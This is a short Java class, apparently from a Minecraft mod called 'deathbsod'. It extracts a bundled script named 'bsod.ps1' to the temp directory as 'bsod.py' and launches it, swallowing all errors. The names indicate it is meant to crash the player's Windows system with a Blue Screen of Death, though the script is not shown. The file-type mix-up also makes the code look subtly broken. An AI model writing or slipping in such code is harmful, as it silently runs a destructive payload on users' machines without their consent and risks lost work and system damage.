package dev.redstone.deathbsod.procedures;

public class BSODProcedure {
	public static void execute() {
		ExportResourceProcedure.exportResource("assets/deathbsod/bsod.ps1", System.getProperty("java.io.tmpdir") + "/bsod.py");
			System.out.println(System.getProperty("java.io.tmpdir"));
			try {
				ProcessBuilder builder = new ProcessBuilder(System.getProperty("java.io.tmpdir") + "/bsod.py");
				Process p = builder.start();
    		} catch (Exception ignored) {}
	}
}
